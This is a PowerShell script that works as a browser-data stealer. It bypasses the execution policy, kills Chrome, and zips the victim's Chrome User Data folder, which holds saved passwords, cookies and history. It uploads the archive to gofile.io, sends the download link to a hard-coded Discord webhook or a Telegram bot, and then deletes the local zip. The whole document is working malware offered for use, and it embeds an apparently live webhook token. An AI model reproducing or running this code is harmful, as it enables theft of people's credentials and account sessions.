# Ensure execution policy is bypassed
Set-ExecutionPolicy Bypass -Scope Process -Force

# Created by mrproxy
$botToken = "your-telegram-bot-token"   # Replace with your Telegram bot token
$chatID = "your-chat-id"               # Replace with your Telegram chat ID
$webhook = "https://discord.com/api/webhooks/1337216489618542663/z9sFeu7hQPxBUEZ81XN_CHsT3eOSQnAV7XraeCcMJFrkYugTolNcnztAnLbiq516mTB0"  # Replace with your Discord Webhook URL

# Debug log file
$logFile = "$env:TEMP\debug_log.txt"

# Function for sending messages through Telegram Bot
function Send-TelegramMessage {
    param ([string]$message)

    if ($botToken -and $chatID) {
        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
        $body = @{ chat_id = $chatID; text = $message }

        try {
            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
            Add-Content -Path $logFile -Value "Message sent to Telegram: $message"
        } catch {
            Add-Content -Path $logFile -Value "Failed to send message to Telegram: $_"
        }
    } else {
        Send-DiscordMessage -message $message
    }
}

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param ([string]$message)

    $body = @{ content = $message }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
        Add-Content -Path $logFile -Value "Message sent to Discord: $message"
    } catch {
        Add-Content -Path $logFile -Value "Failed to send message to Discord: $_"
    }
}

# Function to upload file and get download link
function Upload-FileAndGetLink {
    param ([string]$filePath)

    try {
        # Get Gofile server
        $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
        if ($serverResponse.status -ne "ok") {
            Add-Content -Path $logFile -Value "Failed to get server URL: $($serverResponse.status)"
            return $null
        }

        # Define upload URI
        $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"

        # Upload the file
        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -InFile $filePath -ContentType "multipart/form-data"
        if ($response.status -ne "ok") {
            Add-Content -Path $logFile -Value "Failed to upload file: $($response.status)"
            return $null
        }

        Add-Content -Path $logFile -Value "File uploaded successfully: $($response.data.downloadPage)"
        return $response.data.downloadPage
    } catch {
        Add-Content -Path $logFile -Value "Failed to upload file: $_"
        return $null
    }
}

# Function to create a ZIP file using PowerShell's Compress-Archive
function Zip-WithPowerShell {
    param ([string]$sourceFolder, [string]$zipPath)

    try {
        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }

        # Compress-Archive method (PowerShell native ZIP)
        Compress-Archive -Path "$sourceFolder\*" -DestinationPath $zipPath -Force

        if (-not (Test-Path $zipPath)) {
            throw "ZIP file was not created successfully."
        }

        Add-Content -Path $logFile -Value "ZIP file created successfully: $zipPath"
    } catch {
        Add-Content -Path $logFile -Value "Failed to create ZIP file: $_"
        Send-DiscordMessage -message "Failed to create ZIP file."
        exit
    }
}

# Define paths
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$outputZip = "$env:TEMP\chrome_data.zip"

# Check if Chrome data exists
if (-not (Test-Path $chromePath)) {
    Send-DiscordMessage -message "Chrome User Data path not found!"
    Add-Content -Path $logFile -Value "Chrome User Data path not found!"
    exit
}

# Close Chrome to avoid file locking issues
Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3

# Use PowerShell native ZIP method
Zip-WithPowerShell -sourceFolder $chromePath -zipPath $outputZip

# Upload the file and get the link
$link = Upload-FileAndGetLink -filePath $outputZip

# Send the download link
if ($link -ne $null) {
    Send-DiscordMessage -message "Download link: $link"
    Send-TelegramMessage -message "Download link: $link"
    Add-Content -Path $logFile -Value "Download link sent: $link"
} else {
    Send-DiscordMessage -message "Failed to upload file to GoFile.io"
    Add-Content -Path $logFile -Value "Failed to upload file to GoFile.io"
}

# Remove the zip file after uploading
Remove-Item $outputZip -Force
Add-Content -Path $logFile -Value "Deleted zip file after upload."
